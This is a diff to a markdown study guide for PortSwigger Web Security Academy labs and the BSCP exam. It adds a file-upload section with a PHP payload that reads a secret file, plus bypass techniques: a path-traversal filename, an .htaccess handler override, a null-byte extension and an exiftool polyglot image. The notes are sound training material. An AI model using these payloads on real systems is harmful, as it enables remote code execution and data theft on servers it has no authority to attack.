@@ -1513,6 +1513,27 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 [PortSwigger Academy File-path-traversal](https://portswigger.net/web-security/file-path-traversal)  
 
+## File Uploads
+
+>A vulnerable image upload function, can by exploited and security controls bypassed to upload content to extract sensitive data or execute code server side.  
+
+>***Identify*** any type of file upload.  
+
+![Identify file upload](images/file-upload.png)  
+
+>Content of exploit php 
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```  
+
+>File upload vulnerabilities bypass examples:  
+  
+1. Upload ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
+2. Upload ***.htaccess*** with content  ```AddType application/x-httpd-php .l33t``` allowing the upload and execute of file named, ```exploit.l33t```  
+3. Upload file named, ```exploit.php%00.jpg``` and get the file execution at ```/files/avatars/exploit.php```  
+4. Create polygot using valid image file, using ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" stickman.jpg -o polyglot.php```. Get ```/files/avatars/polyglot.php``` content and search for ```START``` to obtain sensitive data.  
+  
+
 # Appendix  
 
 >This section contain **additional** info to solving the Portswigger labs and BSCP exam for example the youtube content creators, speed scanning, and python automated scripts I copied from @tjc_.  
@@ -1546,7 +1567,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 [PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
   
-# Approach  
+## Approach  
 
 >This is my personal view of the possible approach to leverage identified vulnerabilites and then using these notes to progress through the BSCP exam stages.  
 
